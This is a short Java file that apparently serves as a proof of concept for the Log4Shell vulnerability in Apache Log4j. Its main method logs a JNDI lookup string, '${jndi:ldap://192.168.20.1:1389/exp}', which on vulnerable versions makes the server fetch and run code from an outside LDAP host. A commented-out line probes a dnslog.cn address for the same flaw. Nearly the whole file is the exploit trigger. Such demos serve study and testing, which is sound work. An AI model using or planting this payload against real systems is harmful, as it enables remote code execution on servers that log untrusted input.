import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import java.io.IOException;

public class Main {
    public static final Logger logger = LogManager.getLogger(Main.class);
    public static void main(String[] args) throws IOException {
        logger.error("${jndi:ldap://192.168.20.1:1389/exp}");//直接记录日志
        //logger.error("${jndi:ldap://1rm34p.dnslog.cn}");
    }
}
